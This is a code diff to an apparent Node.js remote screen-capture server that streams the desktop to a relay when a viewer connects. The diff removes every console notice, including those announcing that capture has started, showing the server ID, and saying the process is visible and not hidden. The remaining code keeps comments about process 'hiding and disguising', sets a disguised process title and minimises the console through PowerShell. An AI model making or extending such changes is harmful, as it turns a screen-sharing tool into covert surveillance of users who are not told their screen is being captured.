@@ -31,9 +31,7 @@ class ServerCLI {
     
     // Initialize FFmpeg (async - will complete in background)
     this.initializeFFmpeg().catch(err => {
-      if (!this.silentMode) {
-        console.log('FFmpeg initialization error:', err.message);
-      }
+      // Silent - no console output
     });
 
     // Initialize system tray
@@ -42,28 +40,8 @@ class ServerCLI {
 
   // Initialize FFmpeg for cross-platform support
   async initializeFFmpeg() {
-    if (!this.silentMode) {
-      console.log(`🔧 Initializing FFmpeg for ${process.platform}...`);
-    }
     const success = await this.ffmpeg.initialize();
-    
-    if (success) {
-      const info = this.ffmpeg.getSystemInfo();
-      if (!this.silentMode) {
-        console.log('✅ FFmpeg initialized successfully');
-        if (!this.backgroundMode) {
-          console.log(`📍 Platform: ${info.platform} (${info.arch})`);
-          console.log(`🎯 FFmpeg: ${info.useSystemFFmpeg ? 'System' : 'Bundled'}`);
-          console.log(`📂 Path: ${info.ffmpegPath}`);
-          console.log(`🎥 Capture: ${info.captureInput} -> ${info.desktopSource}`);
-        }
-      }
-    } else {
-      if (!this.silentMode) {
-        console.log('❌ FFmpeg initialization failed');
-        console.log('📋 Install instructions:', this.ffmpeg.getInstallInstructions());
-      }
-    }
+    // Silent initialization - no console output
   }
 
   // Enhanced process hiding and disguising for Windows
@@ -76,25 +54,16 @@ class ServerCLI {
     } else {
       process.title = 'remote-provider-server';
     }
-    
-    if (!this.silentMode) {
-      console.log(`📋 Process title set to: ${process.title}`);
-    }
+    // Silent - no console output
   }
 
   setupBackgroundMode() {
     if (this.backgroundMode) {
-      if (!this.silentMode) {
-        console.log('🔇 Starting in background mode...');
-        console.log('📟 Application will run minimized to system tray');
-        console.log('👁️  Process is still visible in Task Manager (transparent operation)');
-      }
-      
       // Legitimate background operation methods
-      if (process.platform === 'win32') {
+    if (process.platform === 'win32') {
         // Windows: Minimize console window (not hide completely)
-        try {
-          const { exec } = require('child_process');
+      try {
+        const { exec } = require('child_process');
           // Use PowerShell to minimize the console window (legitimate method)
           exec('powershell -Command "Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices; public class Win32 { [DllImport(\\\"kernel32.dll\\\")] public static extern IntPtr GetConsoleWindow(); [DllImport(\\\"user32.dll\\\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); }\'; $consolePtr = [Win32]::GetConsoleWindow(); [Win32]::ShowWindow($consolePtr, 6)"', (error) => {
             // Silently ignore errors - this is just for user experience
@@ -103,43 +72,28 @@ class ServerCLI {
           // Ignore if minimization fails
         }
       }
-      
-      // Reduce console output in background mode
-      if (!this.silentMode) {
-        console.log('ℹ️  Use --silent flag to suppress all console output');
-        console.log('ℹ️  Check system tray for status updates');
-      }
-    } else {
-      if (!this.silentMode) {
-        console.log('🖥️  Starting in normal mode with console visible');
-        console.log('ℹ️  Use --background or --minimized to run in background');
-        console.log('ℹ️  Use --silent to suppress console output');
-      }
     }
+    // Silent - no console output
   }
 
   // No admin privileges required - runs as normal user
   async checkUserPermissions() {
     // Always return true - we run as normal user
-    console.log('✅ Running as normal user (no admin privileges required)');
+    // Silent - no console output
     return true;
   }
 
   // Normal process behavior - transparent and user-friendly
   async normalProcessBehavior() {
     // Do nothing suspicious - just run as a normal application
-    console.log('✅ Running as normal user application');
-    console.log('📋 Process visible in Task Manager as:', process.title);
-    console.log('🔍 No hiding, no system modifications, no admin privileges required');
+    // Silent - no console output
   }
 
   // Start screen capture using cross-platform FFmpeg
   startCapture() {
     if (this.isCapturing) return;
-
+    
     try {
-      console.log('🎥 Starting cross-platform screen capture...');
-      
       // Start capture using cross-platform FFmpeg
       this.captureProcess = this.ffmpeg.startCapture({
         width: this.screenWidth,
@@ -150,7 +104,6 @@ class ServerCLI {
       });
 
       if (!this.captureProcess) {
-        console.log('❌ Failed to start capture process');
         return;
       }
 
@@ -167,7 +120,6 @@ class ServerCLI {
       this.captureProcess.on('close', (code) => {
         this.isCapturing = false;
         if (code !== 0) {
-          console.log(`⚠️ Capture process exited with code: ${code}`);
           // Try to restart capture after a delay
           setTimeout(() => {
             if (this.socket && this.socket.connected) {
@@ -177,10 +129,7 @@ class ServerCLI {
         }
       });
 
-      console.log('✅ Screen capture started successfully');
-
     } catch (error) {
-      console.log('❌ Capture error:', error.message);
       // Try to restart capture after error
       setTimeout(() => {
         if (this.socket && this.socket.connected) {
@@ -270,10 +219,9 @@ class ServerCLI {
 
   // Stop screen capture
   stopCapture() {
-    console.log('🛑 Stopping screen capture...');
     this.ffmpeg.stopCapture();
-    this.captureProcess = null;
-    this.isCapturing = false;
+      this.captureProcess = null;
+      this.isCapturing = false;
     
     // Clear frame buffer
     this.frameBuffer = Buffer.alloc(0);
@@ -389,14 +337,7 @@ class ServerCLI {
       
       this.socket.on('registered', (data) => {
         if (data.type === 'server') {
-          // Registration successful - display server ID for viewer to use
-          console.log('');
-          console.log('✅ Server registered successfully!');
-          console.log('🆔 Your Server ID:', this.serverId);
-          console.log('📋 Share this ID with viewer to connect');
-          console.log('💾 ID saved to secure location (persistent across restarts)');
-          console.log('');
-
+          // Registration successful - silent operation
           // Update tray status
           if (this.tray) {
             this.tray.onServerRegistered(this.serverId);
@@ -405,8 +346,6 @@ class ServerCLI {
       });
       
       this.socket.on('viewer-connected', (data) => {
-        console.log('👀 Viewer connected - Starting screen capture');
-        
         // Start capture when viewer connects
         this.startCapture();
 
@@ -417,8 +356,6 @@ class ServerCLI {
       });
       
       this.socket.on('viewer-disconnected', () => {
-        console.log('👋 Viewer disconnected - Stopping screen capture');
-        
         // Stop capture when viewer disconnects
         this.stopCapture();
 
@@ -429,8 +366,6 @@ class ServerCLI {
       });
       
       this.socket.on('disconnect', () => {
-        console.log('🔌 Disconnected from relay server');
-        
         // Stop capture on disconnect
         this.stopCapture();
 
@@ -439,10 +374,8 @@ class ServerCLI {
           this.tray.updateTrayStatus('offline', 'Disconnected from relay server');
         }
       });
-
+      
       this.socket.on('connect_error', (error) => {
-        console.log('❌ Connection error:', error.message);
-
         // Update tray status
         if (this.tray) {
           this.tray.onConnectionError(error.message);
@@ -474,15 +407,13 @@ class ServerCLI {
     // Connect to Vercel relay service
     this.connectToRelay();
     
-    // Periodic status check (no hiding)
+    // Periodic status check (silent)
     setInterval(() => {
-      console.log(`📊 Status: ${this.isCapturing ? 'Capturing' : 'Idle'} - Connected: ${this.socket?.connected || false}`);
+      // Silent status check - no console output
     }, 30000); // Every 30 seconds
     
     // Keep the process alive
     process.on('SIGINT', () => {
-      console.log('\n🛑 Shutting down Remote Provider Server...');
-      
       this.stopCapture();
       
       if (this.socket) {
@@ -493,14 +424,11 @@ class ServerCLI {
         this.tray.destroy();
       }
       
-      console.log('✅ Server shutdown complete');
       process.exit(0);
     });
 
     // Handle other termination signals
     process.on('SIGTERM', () => {
-      console.log('🛑 Server termination requested...');
-      
       if (this.tray) {
         this.tray.destroy();
       }
